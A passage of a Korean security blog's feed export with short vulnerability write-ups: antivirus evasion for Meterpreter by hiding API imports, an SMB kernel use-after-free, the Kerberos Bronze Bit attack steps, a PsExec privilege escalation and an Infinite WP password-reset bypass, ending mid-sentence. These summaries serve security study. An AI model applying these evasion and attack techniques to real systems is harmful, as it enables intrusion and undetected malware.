&#xC791;&#xC5C5;&#xB4E4;&#xC774;&#xB2E4; &#x1F642;</p><h3 id="More-stealth"><a href="#More-stealth" class="headerlink" title="More stealth"></a>More stealth</h3><p>run-time dynamic linking&#xC744; &#xC218;&#xD589;&#xD558;&#xAE30; &#xC704;&#xD574; &#xC2E4;&#xC81C;&#xB85C; API <code>LoadLibrary/GetProcAddress</code>&#xAC00; &#xD544;&#xC694;&#xD558;&#xC9C0; &#xC54A;&#xB2E4;.</p><p>&#xD6C4;&#xD0B9;&#xC744; &#xD53C;&#xD558;&#xAE30; &#xC704;&#xD574; &#xC774; &#xD568;&#xC218;&#xB4E4;&#xC740; &#xC7AC;&#xAD6C;&#xD604;&#xD558;&#xB294; &#xAC83;&#xC774; &#xC88B;&#xACE0; &#xC774;&#xBBF8; &#xADF8;&#xAC83;&#xC744; &#xD560; &#xC218; &#xC788;&#xB294; &#xC624;&#xD508;&#xC18C;&#xC2A4; &#xD504;&#xB85C;&#xC81D;&#xD2B8;&#xAC00; &#xC788;&#xB2E4;.(<a href="https://github.com/rapid7/ReflectiveDLLInjection/">ReflectiveDllInjection</a>)</p><p>&#xC5EC;&#xAE30;&#xAE4C;&#xC9C0; &#xC77D;&#xC5C8;&#xB2E4;&#xBA74;, translation unit&#xC758; &#xC0C1;&#xB2E8;&#xC5D0; &#xC774;&#xB7EC;&#xD55C; &#xD568;&#xC218;&#xB4E4;&#xC744; &#xC704;&#xD55C; &#xAD6C;&#xD604;&#xC744; &#xCD94;&#xAC00;&#xD558;&#xACE0;(<code>findInjectionSpot</code> &#xC0AC;&#xC6A9;) WinAPI &#xB300;&#xC2E0;&#xC5D0; &#xAD6C;&#xD604;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xAE30; &#xC704;&#xD574; &#xBA54;&#xC18C;&#xB4DC; <code>addGetProcAddress</code>&#xB97C; &#xC5C5;&#xB370;&#xC774;&#xD2B8;&#xD558;&#xBA74; &#xB41C;&#xB2E4;&#xB294; &#xAC83;&#xC744; &#xC54C; &#xAC83;&#xC774;&#xB2E4;.</p><h3 id="Error-handling"><a href="#Error-handling" class="headerlink" title="Error handling"></a>Error handling</h3><ul><li><code>LoadLibrary</code>&#xB294; &#xC131;&#xACF5;&#xC801;&#xC73C;&#xB85C; &#xC218;&#xD589;&#xB418;&#xC9C0; &#xC54A;&#xC744; &#xACBD;&#xC6B0; <code>NULL</code>&#xC744; &#xBC18;&#xD658;&#xD558;&#xBBC0;&#xB85C; &#xC774;&#xC5D0; &#xB300;&#xD55C; &#xAC80;&#xC0AC;&#xB97C; &#xCD94;&#xAC00;&#xD558;&#xC5EC; &#xC624;&#xB958;&#xB97C; &#xC815;&#xC0C1;&#xC801;&#xC73C;&#xB85C; &#xBCF5;&#xAD6C;&#xD560; &#xC218; &#xC788;&#xB2E4;. &#xD604;&#xC7AC; &#xC0C1;&#xD669;&#xC5D0;&#xC11C; &#xD06C;&#xB798;&#xC2DC;&#xAC00; &#xB9E4;&#xC6B0; &#xC798; &#xB0A0; &#xC218;&#xB3C4; &#xC788;&#xB2E4;.</li><li><code>GetProcAddress</code>&#xB3C4; &#xC624;&#xB958;&#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xBA74; <code>NULL</code>&#xC744; &#xBC18;&#xD658;&#xD558;&#xBBC0;&#xB85C; &#xC774;&#xAC83;&#xB3C4; &#xD655;&#xC778;&#xD558;&#xB294; &#xAC83;&#xC774; &#xC911;&#xC694;&#xD558;&#xB2E4;.</li></ul><h2 id="&#xACB0;&#xB860;"><a href="#&#xACB0;&#xB860;" class="headerlink" title="&#xACB0;&#xB860;"></a>&#xACB0;&#xB860;</h2><p>&#xC774; &#xAE00;&#xC5D0;&#xC11C; &#xC6B0;&#xB9AC;&#xB294; &#xC815;&#xADDC;&#xC2DD;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xC9C0; &#xC54A;&#xACE0; C/C++ &#xCF54;&#xB4DC; &#xBCA0;&#xC774;&#xC2A4;&#xC5D0;&#xC11C; &#xD568;&#xC218; &#xD638;&#xCD9C;&#xC744; &#xC815;&#xD655;&#xD558;&#xAC8C; &#xAD50;&#xCCB4;&#xD560; &#xC218; &#xC788;&#xB294; &#xBC29;&#xBC95;&#xC744; &#xBCF4;&#xC5EC;&#xC92C;&#xB2E4;. &#xBAA8;&#xB4E0; &#xAC83;&#xC740; &#xC548;&#xD2F0;&#xBC14;&#xC774;&#xB7EC;&#xC2A4; &#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4;&#xAC00; &#xC6B0;&#xB9AC;&#xAC00; pentest&#xB97C; &#xD558;&#xB294; &#xB3D9;&#xC548; &#xC0AC;&#xC6A9;&#xD558;&#xB294; Meterpreter&#xB098; &#xB2E4;&#xB978; &#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4;&#xC5D0; &#xAD00;&#xD574; &#xD589;&#xB3D9; &#xC815;&#xBCF4;&#xB97C; &#xC815;&#xC801;&#xC73C;&#xB85C; &#xC218;&#xC9D1;&#xD558;&#xB294; &#xAC83;&#xC744; &#xB9C9;&#xAE30; &#xC704;&#xD574; &#xC9C4;&#xD589;&#xB418;&#xC5C8;&#xB2E4;.</p><p>ESET Nod32&#xC5D0; &#xC801;&#xC6A9;&#xB41C; &#xC774; &#xC791;&#xC5C5;&#xC740; &#xBAA8;&#xB4E0; Meterpreter &#xBAA8;&#xB4C8;&#xC774; &#xD0D0;&#xC9C0;&#xB418;&#xC9C0; &#xC54A;&#xB3C4;&#xB85D; &#xD558;&#xB294; &#xC8FC;&#xC694; &#xB2E8;&#xACC4;&#xC600;&#xACE0; &#xB354; &#xBC1C;&#xC804;&#xB41C; &#xC81C;&#xD488;&#xC5D0; &#xB3C4;&#xC6C0;&#xC774; &#xB418;&#xC5C8;&#xB2E4;.</p><p>API imports&#xB97C; &#xC228;&#xAE30;&#xB294; &#xAC83;&#xB3C4; &#xD558;&#xB098;&#xC9C0;&#xB9CC; &#xC545;&#xC131;&#xCF54;&#xB4DC;&#xAC00; &#xC2E4;&#xD589;&#xB418;&#xBA74; &#xBCF4;&#xC548; &#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4;&#xAC00; API &#xD638;&#xCD9C; &#xBAA8;&#xB2C8;&#xD130;&#xB9C1;&#xC5D0; &#xC758;&#xD574; &#xD589;&#xB3D9; &#xC815;&#xBCF4;&#xB97C; &#xC218;&#xC9D1;&#xD558;&#xB294; &#xBC29;&#xBC95;&#xB3C4; &#xC788;&#xB2E4;.</p><p>&#xADF8;&#xB7F0; &#xAD00;&#xC810;&#xC5D0;&#xC11C; &#xB2E4;&#xC74C; &#xAE00;&#xC740; &#xC758;&#xC2EC;&#xC2A4;&#xB7EC;&#xC6B4; Win32 API&#xAC00; &#xC9C1;&#xC811;&#xC801;&#xC778; syscalls&#xC744; &#xD558;&#xB3C4;&#xB85D; &#xC790;&#xB3D9;&#xC801;&#xC73C;&#xB85C; refactoring &#xD558;&#xB294; &#xAC83;&#xC774;&#xB2E4;. &#xC774;&#xAC83;&#xC740; Cylance, Traps&#xACFC; Kaspersky &#xAC19;&#xC740; AV&#xC758; userland hook&#xC744; &#xD1B5;&#xD55C; &#xB7F0;&#xD0C0;&#xC784; &#xD0D0;&#xC9C0; &#xC6B0;&#xD68C;&#xC758; &#xD575;&#xC2EC; &#xB2E8;&#xACC4;&#xC774;&#xB2E4;.</p><h2 id="&#xCD9C;&#xCC98;"><a href="#&#xCD9C;&#xCC98;" class="headerlink" title="&#xCD9C;&#xCC98;"></a>&#xCD9C;&#xCC98;</h2><p>[1] The Rootkit Arsenal, Chapter 11, p.480.</p><p>[2]<a href="https://devblogs.microsoft.com/cppblog/exploring-clang-tooling-part-2-examining-the-clang-ast-with-clang-query/">https://devblogs.microsoft.com/cppblog/exploring-clang-tooling-part-2-examining-the-clang-ast-with-clang-query/</a></p>]]></content>
    
    
    <categories>
      
      <category>Translation</category>
      
    </categories>
    
    
    <tags>
      
      <tag>bypass</tag>
      
      <tag>idioth</tag>
      
      <tag>obfuscation</tag>
      
      <tag>evasion</tag>
      
      <tag>meterpreter</tag>
      
      <tag>iat</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-17140 : SMB uaf to info disclosure</title>
    <link href="/2020/12/12/fabu1ous/2020-12-12/"/>
    <url>/2020/12/12/fabu1ous/2020-12-12/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://blogs.360.cn/post/CVE-2020-17140-Analysis.html">Windows SMB Information Disclousure Analysis</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Windows 7 ~ Windows 10</p><p>svr2.sys &#xB4DC;&#xB77C;&#xC774;&#xBC84;</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>patch Tuesday(2020.12.08)&#xC5D0;&#xC11C; CVE-2020-17140&#xAC00; &#xD328;&#xCE58;&#xB418;&#xC5B4; Write-up&#xC774; &#xACF5;&#xAC1C;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. CVE-2020-17140&#xC740; <code>SMB2_SET_INFO</code> &#xD328;&#xD0B7;&#xC758; &#xCC98;&#xB9AC; &#xB85C;&#xC9C1;&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD558;&#xB294; use after free&#xB85C; &#xCEE4;&#xB110; &#xBA54;&#xBAA8;&#xB9AC;&#xB97C; &#xB178;&#xCD9C;&#xC2DC;&#xD0A4;&#xB294; &#xCDE8;&#xC57D;&#xC810;&#xC785;&#xB2C8;&#xB2E4;.</p><p>SMBv2 &#xC774;&#xD6C4;&#xBD80;&#xD130; LEASE&#xB77C;&#xB294; &#xC0C8;&#xB85C;&#xC6B4; caching mechanism&#xC774; &#xB3C4;&#xC785;&#xB418;&#xC5C8;&#xACE0; &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xB294; <code>SMB2_CREATE_REQEUST_LEASE_V2</code> &#xD328;&#xD0B7;&#xC744; &#xBCF4;&#xB0B4; &#xACF5;&#xC720; &#xD30C;&#xC77C;&#xC5D0; lease&#xB97C; &#xC0DD;&#xC131;&#xD558;&#xACE0;, <code>SMB2_SET_INFO</code> &#xD328;&#xD0B7;&#xC744; &#xBCF4;&#xB0B4; &#xACF5;&#xC720; &#xD30C;&#xC77C;&#xC758; lease&#xB97C; &#xC218;&#xC815;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>srv2.sys &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xB294; SMB2_SET_INFO &#xD328;&#xD0B7;&#xC744; &#xBC1B;&#xC73C;&#xBA74; <code>srv2!Smb2UpdateLeaseFileName</code>&#xB97C; &#xD638;&#xCD9C;&#xD574;&#xC11C; lease &#xC774;&#xB984;&#xC744; &#xC218;&#xC815;&#xD558;&#xB294;&#xB370;, new lease name&#xC774; &#xAE30;&#xC874;&#xC758; old lease name&#xBCF4;&#xB2E4; &#xAE38; &#xACBD;&#xC6B0; &#xC0C8;&#xB85C;&#xC6B4; &#xBA54;&#xBAA8;&#xB9AC;(newFileBuf)&#xB97C; &#xD560;&#xB2F9;&#xD574; old lease name&#xC744; &#xBC31;&#xC5C5;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-keyword">if</span> ( *(_BYTE *)(v6 + <span class="hljs-number">114</span>) )ExFreePoolWithTag(oldFileBuf, <span class="hljs-number">0</span>);<span class="hljs-keyword">if</span> ( v11 )memmove(newFileBuf, oldFileBuf, <span class="hljs-number">2</span>i64 * v11);</code></pre><p>old lease name&#xC744; &#xB2F4;&#xACE0; &#xC788;&#xB358; oldFileBuf&#xB97C; &#xD560;&#xB2F9; &#xD574;&#xC81C;&#xD55C; &#xD6C4;&#xC5D0; newFileBuf&#xC5D0; &#xBCF5;&#xC0AC;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; use after free&#xAC00; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;. oldFileBuf&#xB97C; &#xD574;&#xC81C;&#xD55C; &#xD6C4; &#xB315;&#xAE00;&#xB9C1; &#xD3EC;&#xC778;&#xD130;&#xC758; &#xC0C1;&#xD0DC;&#xC5D0; &#xB530;&#xB77C; kernel info leak &#xB610;&#xB294; BSoD&#xB85C; &#xC774;&#xC5B4;&#xC9C8; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>kernel</tag>
      
      <tag>Fabu1ous</tag>
      
      <tag>use after free</tag>
      
      <tag>smb</tag>
      
      <tag>info leak</tag>
      
      <tag>bsod</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-17049: Kerberos Bronze Bit Attack</title>
    <link href="/2020/12/11/l0ch/2020-12-11/"/>
    <url>/2020/12/11/l0ch/2020-12-11/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://blog.netspi.com/cve-2020-17049-kerberos-bronze-bit-attack/">CVE-2020-17049: Kerberos Bronze Bit Attack &#x2013; Practical Exploitation</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>standard Windows versions since 2000</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Kerberos&#xB294; Windows Active Directory &#xB3C4;&#xBA54;&#xC778; &#xB0B4;&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9;&#xC790;, &#xC11C;&#xBC84; &#xBC0F; &#xAE30;&#xD0C0; &#xB9AC;&#xC18C;&#xC2A4;&#xB97C; &#xC11C;&#xB85C; &#xC778;&#xC99D;&#xD558;&#xB294; &#xB370; &#xC0AC;&#xC6A9;&#xB418;&#xB294; &#xD504;&#xB85C;&#xD1A0;&#xCF5C;&#xC785;&#xB2C8;&#xB2E4;.<br>Kerberos&#xC758; &#xAE30;&#xC874; &#xACF5;&#xACA9; &#xBC29;&#xBC95;&#xC778; Golden Ticket &#xBC0F; Silver Ticket &#xACF5;&#xACA9;&#xC758; &#xBCC0;&#xD615;&#xC778; Bronze Bit &#xACF5;&#xACA9;&#xC774; &#xACF5;&#xAC1C;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><blockquote><p>Golden/Silver Ticket &#xACF5;&#xACA9;<br>&#xB0B4;&#xBD80; &#xB124;&#xD2B8;&#xC6CC;&#xD06C;&#xC5D0; &#xCE68;&#xC785;&#xD55C; &#xC774;&#xD6C4; &#xB3D9;&#xC77C;&#xD55C; &#xB124;&#xD2B8;&#xC6CC;&#xD06C;&#xC758; Kerberos &#xC778;&#xC99D;&#xC2DC;&#xC2A4;&#xD15C;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xB2E4;&#xB978; &#xC2DC;&#xC2A4;&#xD15C;&#xC758; &#xC790;&#xACA9; &#xC99D;&#xBA85;&#xC744; &#xC704;&#xC870;&#xD558;&#xB294; &#xACF5;&#xACA9;&#xAE30;&#xBC95;</p></blockquote><p><br></p><p>Bronze Bit&#xB294; Microsoft&#xAC00; Kerberos &#xD504;&#xB85C;&#xD1A0;&#xCF5C;&#xC5D0; &#xCD94;&#xAC00; &#xD55C; <code>S4U2self</code> &#xBC0F; <code>S4U2proxy</code> &#xD504;&#xB85C;&#xD1A0;&#xCF5C;&#xC744; &#xC545;&#xC6A9;&#xD558;&#xBA70; Kerberos &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xAC00; &#xBCC0;&#xC870;&#xB41C; &#xC11C;&#xBE44;&#xC2A4; &#xD2F0;&#xCF13;&#xC744; &#xAC10;&#xC9C0;&#xD560; &#xC218; &#xC5C6;&#xC5B4; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;. &#xACF5;&#xACA9;&#xC744; &#xC704;&#xD574;&#xC11C;&#xB294; &#xB2E4;&#xC74C; &#xC870;&#xAC74;&#xC774; &#xB9CC;&#xC871;&#xB418;&#xC5B4;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;.</p><ol><li>&#xD574;&#xCEE4;&#xB294; &#xB0B4;&#xBD80; &#xB124;&#xD2B8;&#xC6CC;&#xD06C;&#xC758; &#xC2DC;&#xC2A4;&#xD15C; &#xD558;&#xB098;(Service1)&#xB97C; &#xC7A5;&#xC545;&#xD574; Active Directory &#xB0B4;&#xC5D0; &#xC811;&#xADFC; &#xAD8C;&#xD55C;&#xC774; &#xC788;&#xC5B4;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;.</li><li>&#xCE68;&#xC785;&#xD55C; &#xC2DC;&#xC2A4;&#xD15C;&#xC778; Service1&#xC5D0; &#xB300;&#xD55C; &#xC554;&#xD638; &#xD574;&#xC2DC;&#xAC00; &#xD544;&#xC694;&#xD569;&#xB2C8;&#xB2E4;.</li><li>Service1&#xC5D0;&#xB294; &#xB2E4;&#xB978; &#xC2DC;&#xC2A4;&#xD15C;(Service2)&#xC5D0; &#xB300;&#xD55C; &#xC81C;&#xD55C;&#xB41C; &#xC2E0;&#xB8B0; &#xAD00;&#xACC4;&#xAC00; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</li></ol><p>&#xC704; &#xC870;&#xAC74;&#xC774; &#xB9CC;&#xC871;&#xB418;&#xBA74; &#xD574;&#xCEE4;&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC740; &#xACF5;&#xACA9;&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p><ol><li>&#xC0AC;&#xC6A9;&#xC790;&#xB97C; &#xC2DD;&#xBCC4;&#xD558;&#xACE0; &#xD2F0;&#xCF13;&#xC744; &#xBC18;&#xD658;&#xD558;&#xB294; <code>S4U2self</code> &#xC5D0;&#xC11C; User2&#xC758; Service1 &#xC11C;&#xBE44;&#xC2A4; &#xD2F0;&#xCF13;&#xC744; &#xAC00;&#xC838;&#xC635;&#xB2C8;&#xB2E4;. &#xC774;&#xB54C; <code>force-forwardable</code> &#xC635;&#xC158;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xBA74; &#xBC18;&#xD658;&#xD558;&#xB294; &#xC11C;&#xBE44;&#xC2A4; &#xD2F0;&#xCF13;&#xC774; &#xC804;&#xB2EC; &#xAC00;&#xB2A5;&#xD55C; &#xD2F0;&#xCF13;&#xC73C;&#xB85C; &#xBCC0;&#xD658;&#xB429;&#xB2C8;&#xB2E4;.</li><li>Service1&#xC758; &#xD574;&#xC2DC;&#xB85C; &#xD2F0;&#xCF13;&#xC744; &#xBCF5;&#xD638;&#xD654;&#xD558;&#xACE0; &#xD50C;&#xB798;&#xADF8; &#xAC12;&#xC758; &#xB450; &#xBC88;&#xC9F8; &#xBE44;&#xD2B8;&#xB97C; 0&#x2192;1 &#xB85C; &#xBCC0;&#xACBD;&#xD55C; &#xB4A4; &#xB2E4;&#xC2DC; &#xC554;&#xD638;&#xD654;&#xD569;&#xB2C8;&#xB2E4;. </li><li>&#xC870;&#xC791;&#xB41C; &#xD2F0;&#xCF13;&#xC740; <code>S4U2proxy</code> &#xC5D0;&#xC11C; &#xC804;&#xC1A1;&#xB418;&#xACE0; Service2&#xC5D0; &#xB300;&#xD55C; &#xC11C;&#xBE44;&#xC2A4; &#xD2F0;&#xCF13;&#xC774; User2&#xB85C; &#xBC18;&#xD658;&#xB418;&#xC5B4; <code>User2.ccache</code>&#xC758; &#xB514;&#xC2A4;&#xD06C;&#xC5D0; &#xAE30;&#xB85D;&#xB429;&#xB2C8;&#xB2E4;.</li><li>&#xD574;&#xCEE4;&#xB294; Service1 &#xC720;&#xC800;(User1) &#xAD8C;&#xD55C;&#xC73C;&#xB85C; Service2 &#xC720;&#xC800;(User2)&#xC758; Kerberos &#xC11C;&#xBE44;&#xC2A4; &#xD2F0;&#xCF13;&#xC744; &#xC5BB;&#xC744; &#xC218; &#xC788;&#xC5B4; User2 &#xAD8C;&#xD55C;&#xC73C;&#xB85C; Service2&#xC5D0; &#xC561;&#xC138;&#xC2A4;&#xAC00; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</li></ol><p>&#xC774;&#xB294; Golden/Silver Ticket&#xACFC; &#xC720;&#xC0AC;&#xD55C; &#xACF5;&#xACA9; &#xBC29;&#xBC95;&#xC774;&#xC9C0;&#xB9CC; &#xB2E8;&#xC77C; &#xBE44;&#xD2B8; &#xD50C;&#xB9BD;&#xC744; &#xC774;&#xC6A9;&#xD588;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; Bronze Bit&#xB85C; &#xBA85;&#xBA85;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://blog.netspi.com/cve-2020-17049-kerberos-bronze-bit-theory/">https://blog.netspi.com/cve-2020-17049-kerberos-bronze-bit-theory/</a></p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>windows</tag>
      
      <tag>kerberos</tag>
      
      <tag>L0ch</tag>
      
      <tag>bronze bit</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] PsExec Local Privilege Escalation</title>
    <link href="/2020/12/10/idioth/2020-12-10/"/>
    <url>/2020/12/10/idioth/2020-12-10/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://medium.com/tenable-techblog/psexec-local-privilege-escalation-2e8069adc9c8">PsExec Local Privilege Escalation</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>PsExec v2.2 all the way back to v1.72 (2006)</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><blockquote><p>&#xC544;&#xC9C1; &#xD328;&#xCE58;&#xB418;&#xC9C0; &#xC54A;&#xC740; &#xCDE8;&#xC57D;&#xC810;&#xC785;&#xB2C8;&#xB2E4;.</p></blockquote><p>SysInternals Suite&#xC5D0;&#xC11C; &#xC6D0;&#xACA9;&#xC73C;&#xB85C; &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xC744; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xB294; PsExec&#xC5D0;&#xC11C; Local Privilege Escalation &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB410;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC740; &#xAE00;&#xC744; &#xC791;&#xC131;&#xD55C; &#xC2DC;&#xC810;&#xC758; &#xBC84;&#xC804;&#xC778; PsExec v2.2&#xAE4C;&#xC9C0; &#xC601;&#xD5A5;&#xC744; &#xBBF8;&#xCE58;&#xBA70; &#xC544;&#xC9C1; &#xD328;&#xCE58;&#xB418;&#xC9C0; &#xC54A;&#xC558;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>PsExec &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xC640; &#xC6D0;&#xACA9; PSEXESVC &#xC11C;&#xBE44;&#xC2A4;&#xB294; named pipe&#xB97C; &#xD1B5;&#xD574; &#xD1B5;&#xC2E0;&#xD569;&#xB2C8;&#xB2E4;. &#xADF8; &#xC911; <code>\\PSEXESVC</code> &#xD30C;&#xC774;&#xD504;&#xB294; &#xC2E4;&#xD589;&#xD560; &#xC751;&#xC6A9; &#xD504;&#xB85C;&#xADF8;&#xB7A8;, &#xBA85;&#xB839;&#xC904; &#xB370;&#xC774;&#xD130; &#xB4F1; PsExec &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xC758; &#xBA85;&#xB839;&#xC744; &#xBD84;&#xC11D;&#xD558;&#xC5EC; &#xC2E4;&#xD589;&#xD558;&#xB294; &#xC5ED;&#xD560;&#xC744; &#xD569;&#xB2C8;&#xB2E4;. <code>\\PSEXESVC</code> &#xD30C;&#xC774;&#xD504;&#xB294; Administrator&#xB9CC; read/write &#xAD8C;&#xD55C;&#xC744; &#xAC00;&#xC838; &#xAD8C;&#xD55C;&#xC774; &#xB0AE;&#xC740; &#xC0AC;&#xC6A9;&#xC790;&#xAC00; &#xD30C;&#xC774;&#xD504;&#xC5D0; read\write &#xD558;&#xB294; &#xAC83;&#xC744; &#xB9C9;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xD558;&#xC9C0;&#xB9CC; PSEXESVC&#xAC00; <code>\\PSEXESVC</code> &#xD30C;&#xC774;&#xD504;&#xB97C; &#xC0DD;&#xC131;&#xD560; &#xB54C; &#xD30C;&#xC774;&#xD504;&#xAC00; &#xC774;&#xBBF8; &#xC874;&#xC7AC;&#xD560; &#xACBD;&#xC6B0; &#xD574;&#xB2F9; <code>\\PSEXESVC</code> &#xD30C;&#xC774;&#xD504;&#xC758; handle&#xC744; &#xAC00;&#xC838;&#xC635;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; &#xB0AE;&#xC740; &#xAD8C;&#xD55C;&#xC758; &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xC774; PSEXESVC&#xAC00; &#xC2E4;&#xD589;&#xB418;&#xAE30; &#xC804;&#xC5D0; <code>\\PSEXESVC</code> &#xD30C;&#xC774;&#xD504;&#xB97C; &#xC0DD;&#xC131;&#xD558;&#xBA74; PSEXESVC&#xB294; &#xC790;&#xC2E0;&#xC774; &#xC0DD;&#xC131;&#xD55C; &#xD30C;&#xC774;&#xD504;&#xAC00; &#xC544;&#xB2CC; &#xC774;&#xBBF8; &#xC874;&#xC7AC;&#xD558;&#xB294; &#xD30C;&#xC774;&#xD504;&#xC758; handle&#xC744; &#xAC00;&#xC838;&#xC635;&#xB2C8;&#xB2E4;. PSEXESVC&#xAC00; &#xB0AE;&#xC740; &#xAD8C;&#xD55C;&#xC73C;&#xB85C; &#xC0DD;&#xC131;&#xB41C; <code>\\PSEXESVC</code> &#xD30C;&#xC774;&#xD504;&#xC758; handle&#xC744; &#xAC00;&#xC838;&#xC624;&#xBA74; PSEXESVC&#xC744; &#xD1B5;&#xD574; SYSTEM &#xAD8C;&#xD55C;&#xC73C;&#xB85C; &#xBA85;&#xB839;, &#xC751;&#xC6A9; &#xD504;&#xB85C;&#xADF8;&#xB7A8; &#xC2E4;&#xD589;&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>lpe</tag>
      
      <tag>named pipe</tag>
      
      <tag>idioth</tag>
      
      <tag>psexec</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-28642: Auth bypass via password reset mechanism</title>
    <link href="/2020/12/09/fabu1ous/2020-12-09/"/>
    <url>/2020/12/09/fabu1ous/2020-12-09/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://ssd-disclosure.com/ssd-advisory-auth-bypass-and-rce-in-infinite-wp-admin-panel/">Auth bypass and RCE in Infinite WP admin panel</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Infinite WP &lt;= 2.15.6</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>WordPress &#xC6F9;&#xC0AC;&#xC774;&#xD2B8;&#xC758; &#xAD00;&#xB9AC; &#xC194;&#xB8E8;&#xC158; Infinite WP&#xC5D0;&#xC11C; &#xBE44;&#xBC00;&#xBC88;&#xD638; &#xC7AC;&#xC124;&#xC815; &#xBC29;&#xC2DD;&#xC758; &#xACB0;&#xD568;&#xC744; &#xC774;&#xC6A9;&#xD574; admin panel&#xC5D0; &#xC811;&#xADFC;&#xD560; &#xC218; &#xC788;&#xB294; &#xC778;&#xC99D; &#xC6B0;&#xD68C; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs php">$hashValue = serialize(<span class="hljs-keyword">array</span>(<span class="hljs-string">&apos;hashCode&apos;</span> =&gt; <span class="hljs-string">&apos;resetPassword&apos;</span>, <span class="hljs-string">&apos;uniqueTime&apos;</span> =&gt; microtime(<span class="hljs-literal">true</span>), <span class="hljs-string">&apos;userPin&apos;</span> =&gt; $userDets[<span class="hljs-string">&apos;userID&apos;</span>]));$resetHash = sha1($hashValue);[...]$verificationURL = APP_URL.<span class="hljs-string">&quot;login.php?view=resetPasswordChange&amp;resetHash=&quot;</span>.$resetHash.<span class="hljs-string">&quot;&amp;transID=&quot;</span>.sha1($params[<span class="hljs-string">&quot;email&quot;</span>]);</code></pre><p>&#xBE44;&#xBC00;&#xBC88;&#xD638; &#xC7AC;&#xC124;&#xC815; &#xB9C1;&#xD06C;&#xB97C; &#xC0DD;&#xC131;&#xD558;&#xB294; php&#xCF54;&#xB4DC;&#xC785;&#xB2C8;&#xB2E4;.  &#xD53C;&#xD574;&#xC790;&#xC758; <code>email</code>&#xC744; &#xC0AC;&#xC804;&#xC5D0; &#xC785;&#xC218;&#xD558;&#xACE0; <code>userID</code>,  <code>microtime(true)</code> &#xAC12;&#xC744; &#xC720;&#xCD94;&#xD560; 